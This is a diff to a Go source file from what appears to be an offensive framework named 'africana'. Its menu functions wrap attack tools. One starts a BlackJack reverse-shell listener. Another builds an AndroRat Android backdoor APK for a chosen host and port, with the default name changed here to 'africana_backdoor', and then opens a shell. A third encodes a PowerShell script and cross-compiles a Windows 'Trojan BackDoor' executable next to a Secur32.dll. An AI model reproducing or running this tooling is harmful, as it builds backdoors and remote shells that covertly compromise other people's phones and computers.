@@ -99,7 +99,6 @@ func BlackJack() {
         if userLport == "" {
             userLport = "9999"
         }
-        utils.ClearScreen()
         banners.Banner()
         subprocess.Popen(`cd /root/.africana/africana-base/blackjack/; python3 BlackJack.py -q -i -n %s`, userLport)
     case "2":
@@ -117,7 +116,6 @@ func BlackJack() {
         if userHport == "" {
             userHport = "3333"
         }
-        utils.ClearScreen()
         banners.Banner()
         subprocess.Popen(`cd /root/.africana/africana-base/blackjack/; python3 BlackJack.py -q -i -c /root/.africana/certs/africana-cert.pem -k /root/.africana/certs/africana-key.pem -x %s -n %s`, userLport, userHport)
     default:
@@ -182,7 +180,7 @@ func AndroRat() {
     userMalware, _ := reader.ReadString('\n')
     userMalware = strings.TrimSpace(userMalware)
     if userMalware == "" {
-        userMalware = "africana.apk"
+        userMalware = "africana_backdoor"
     }
     fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Output path " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "/root/.africana/output/" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
     fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
@@ -191,11 +189,12 @@ func AndroRat() {
     if userOutput == "" {
         userOutput = "/root/.africana/output/"
     }
+    banners.Banner()
     subprocess.Popen(`cd /root/.africana/africana-base/androrat/; python3 androrat.py --build -i %s -p %s -o %s`, userLhost, userLport, userOutput + userMalware + ".apk")
     subprocess.Popen(`cd /root/.africana/africana-base/androrat/; python3 androrat.py --shell -i %s -p %s`, userLhost, userLport)
 }
 
-func NoiseMaker() {
+func NoiseMakers() {
     fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "use" + bcolors.ENDC + ": " + bcolors.BLUE + bcolors.ITALIC + "1. " + bcolors.YELLOW + "TCP " + bcolors.BLUE + "2. " + bcolors.YELLOW + "HTTPS " + bcolors.BLUE + "or " + bcolors.BLUE + "0. " + bcolors.PURPLE + "Go back" + bcolors.BLUE + ")" + bcolors.ENDC)
     fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
     userInput, _ := reader.ReadString('\n')
@@ -277,10 +276,10 @@ func NoiseMaker() {
     default:
         fmt.Println(bcolors.BLUE + "( " + bcolors.RED + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 to 2 " + bcolors.BLUE + ")" + bcolors.ENDC)
     }
-    NoiseCompiler()
+    NoiseCompilers()
 }
 
-func NoiseCompiler() {
+func NoiseCompilers() {
     filePath := "/root/.africana/output/noisemaker.ps1"
     content, err := ioutil.ReadFile(filePath)
     if err != nil {
@@ -306,10 +305,10 @@ func NoiseCompiler() {
     fmt.Printf(bcolors.BLUE + "\nBase64 Encoded PS1 Script:" + bcolors.DARKGREEN + "\n%s" + bcolors.ENDC, encoded)
     fmt.Printf(bcolors.BLUE + "\n\nBuilding the Trojan BackDoor:\n" + bcolors.ENDC)
     subprocess.Popen(`GOOS=windows GOARCH=amd64 go build -o /root/.africana/output/noisemaker.exe /root/.africana/output/noisemaker.go`)
-    NoiseBuilder()
+    NoiseBuilders()
 }
 
-func NoiseBuilder() {
+func NoiseBuilders() {
     binaryFilePath := "/root/.africana/africana-base/africana-bines/Secur32.dll"
     exeFilePath := "/root/.africana/output/noisemaker.exe"
 
